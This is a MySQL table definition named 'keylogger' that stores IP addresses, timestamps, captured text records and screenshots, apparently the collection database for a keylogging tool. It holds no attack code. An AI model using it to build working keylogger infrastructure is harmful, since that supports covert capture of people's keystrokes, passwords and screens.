CREATE TABLE IF NOT EXISTS `keylogger` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `ip` varchar(50) NOT NULL,
  `dat` datetime NOT NULL,
  `record` text,
  `screenshot` mediumblob,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=80 ;
